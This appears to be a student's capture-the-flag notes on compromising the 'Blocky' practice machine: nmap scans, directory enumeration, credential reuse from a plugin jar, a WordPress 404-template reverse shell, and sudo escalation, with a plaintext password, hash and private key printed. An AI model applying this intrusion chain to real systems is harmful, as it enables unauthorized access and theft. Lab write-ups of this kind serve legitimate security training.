@@ -1,0 +1,104 @@
+kali@kali:~$ nmap -sC -sV 10.10.10.37
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 16:21 EDT
+Nmap scan report for 10.10.10.37
+Host is up (0.16s latency).
+Not shown: 996 filtered ports
+PORT     STATE  SERVICE VERSION
+21/tcp   open   ftp     ProFTPD 1.3.5a
+22/tcp   open   ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)
+|   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)
+|_  256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519)
+80/tcp   open   http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-generator: WordPress 4.8
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: BlockyCraft &#8211; Under Construction!
+8192/tcp closed sophos
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel     
+
+
+
+kali@kali:~/Downloads$ sudo nmap -sU -sT -T4 --max-retries 0 10.10.10.37
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 16:22 EDT
+Warning: 10.10.10.37 giving up on port because retransmission cap hit (0).
+Warning: 10.10.10.37 giving up on port because retransmission cap hit (0).
+Nmap scan report for 10.10.10.37
+Host is up (0.16s latency).
+Not shown: 998 open|filtered ports, 996 filtered ports
+PORT     STATE  SERVICE
+21/tcp   open   ftp
+22/tcp   open   ssh
+80/tcp   open   http
+8192/tcp closed sophos
+22/udp   closed ssh
+80/udp   closed http
+
+
+/wiki (Status: 301)
+/wp-content (Status: 301)
+/plugins (Status: 301)
+/wp-includes (Status: 301)
+/javascript (Status: 301)
+/wp-admin (Status: 301)
+/phpmyadmin (Status: 301)
+
+
+this is a wp site, we should check wp at some point
+
+it also has /phpmyadmin, not sure if we should do anything on this
+
+the /wiki has some hit for check out /plugins, it has two source code jar
+
+inside the jar it has the root and password, which we can login to phpmyadmin
+
+root
+8YsqfCTnvxAUeduzjNSXe22
+
+
+
+we find this user
+
+notch@blockcraftfake.com
+$P$BiVoTj899ItS1EZnMhqeqVbrZI4Oq0/
+
+
+we have update MD5 on the user password, and then login as admin user
+
+after edit appearance -> edit -> 404 template to reverse shell
+
+now we can reverse shell in
+
+
+http://10.10.10.37/wp-content/themes/twentyseventeen/404.php
+
+
+$ cat public.key
+MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAnbndz5roQhnDRbO1xHAPfl8PTvX7kVt4GnYmrfuL5924s4obsv2bCPGQbDOTYMPoSv1OpIaP/36NH849qp+AalQQM3Q0oU7vEJ5qP5co603AHxl22pD25TbNGIRtCacnbRmwPqt43JKhzu4ZRfw710TjnX8ZWmTPdw749cXM9aNtQM6EeuHxqmx0hdoR90x9pye+B5kzb+fe1YKcu123D6xpfj6DHNIdTIFfikd7kIgD4Ou4AmeLt8R6WunIP9fFyH4o1+RS4/cLLkA4H7kindhIXhFRwUyiCj5w3PmG//A/y+rQhFJzNGEwC14kncK0hy78uG++8+5fFvDeVnNzeQIDAQAB$ 
+$ 
+$ cat private.key
+MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQCdud3PmuhCGcNFs7XEcA9+Xw9O9fuRW3gadiat+4vn3bizihuy/ZsI8ZBsM5Ngw+hK/U6kho//fo0fzj2qn4BqVBAzdDShTu8Qnmo/lyjrTcAfGXbakPblNs0YhG0JpydtGbA+q3jckqHO7hlF/DvXROOdfxlaZM93Dvj1xcz1o21AzoR64fGqbHSF2hH3TH2nJ74HmTNv597Vgpy7XbcPrGl+PoMc0h1MgV+KR3uQiAPg67gCZ4u3xHpa6cg/18XIfijX5FLj9wsuQDgfuSKd2EheEVHBTKIKPnDc+Yb/8D/L6tCEUnM0YTALXiSdwrSHLvy4b77z7l8W8N5Wc3N5AgMBAAECggEAahJXc4iv7dQ5mKSU9ziNkuUG/Ik817J2AQW4WYUzv4lC76tPmX4oR0l9YOcGlCrsC5Jy0v6T1LUc32jp29dMmzVRd+kMg/b7m2eN+JoFsMknDUMoxTB8egXyxCw60CUTxLFj76GNtHkATJOfd4t8CvePQ5n4SOxHAcCV+WM+xWpDaAJuPBT2ffdw1gnNnFaEp7ryRowNvXCDR49Z2CORiEeX/ICdiKVcDH5Vtl49n2wJk2qv/HJpFZvwVOTCneDeCcEBoXeOojEaDggbsxPjFPfMG8Zo4bOjAu869Afc+b5Ixrcy5ktJUZqdGT+xoHuUsYs2/FWReN0yYJ73ipvYCQKBgQDp49n7jZuuKv6k86m936/44xARZlTagOQmyqsfxmaFZ97Pr8fJrMufv5RN/eHEIcOaZfNwII7fyeDOAjp+HOX0OueR/3AI+Zr15SEL713BEnbytlZCoH0ebvoCNlUgk8L54WsdoQqPu/wLGTZfcFdSkMRUHP1/LQdj+/efq84WvwKBgQCsotfOFyhkumV3HKhbBtMH1lJT4V3hJ87G4GnXITG7qgzdT7KNAe1wxdilHOY4z61A/7a7Ao6a/ecrlKfzWufl9dHoiESc2XVw9YO3wheqZnTy+/8DgrzIm221HH16VgobIBxRrmBv6ZzyjYyNfzfX9bJppYnAR5/a/1090i57xwKBgAwFEabD2ERTIVMI0qhXXovD34eFYsb36MG1mKXBZHNmqySxO+s5Xh2PkuePLJMPySWeJ6yTf8Qwc8UiiC8C/S5X+J6gKfnMGhKY++HJI2BQupwukrBJ3yQ5P8/tSuKptVNyKjcTl59bYdCQMyMkethbaDuKYdyvS7nvsQIbqjOxAoGBAJdhhFNXwzfwqyCzpH2NkmeA7FhZevUA7zU9fBIFLZMeHoHCbRNw6UDGfJ7spISUt5wTn6yFJX+LvbZdeJjQ0iC4WgTJ2UCg/3a6E3KDZDUr+slHZ+swLVLL2HvEK9Omtt3qXmrRugbol5Opw+If+FwLOxOg8RYGuIpU+vJG6DPpAoGBANSVjA1DF6NJWuMdi6uWuQr0iEvNPAm7V7MJ+LcvlzRn2N1VRL4iAEV4Ijk7yVNx7xtAbPcs5WH8iGP8gNDDUUnv30hgHY+J9H8wfCtIpzvoBMiw5Gt1kWyK4e4hKdFnNxaXt4p/5sNeA4PM8EeEwL/rKNxzVXjicQqRE3YZZSiB$ 
+
+
+
+since no python tty, we use /usr/bin/script -qc /bin/bash /dev/null
+
+su notch by using the 1st password we find in the jar
+
+8YsqfCTnvxAUeduzjNSXe22
+
+ 
+own user
+
+notch@Blocky:~$ sudo -l
+[sudo] password for notch: 
+Matching Defaults entries for notch on Blocky:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User notch may run the following commands on Blocky:
+    (ALL : ALL) ALL
+
+shows we can run everything :)
+
+own root
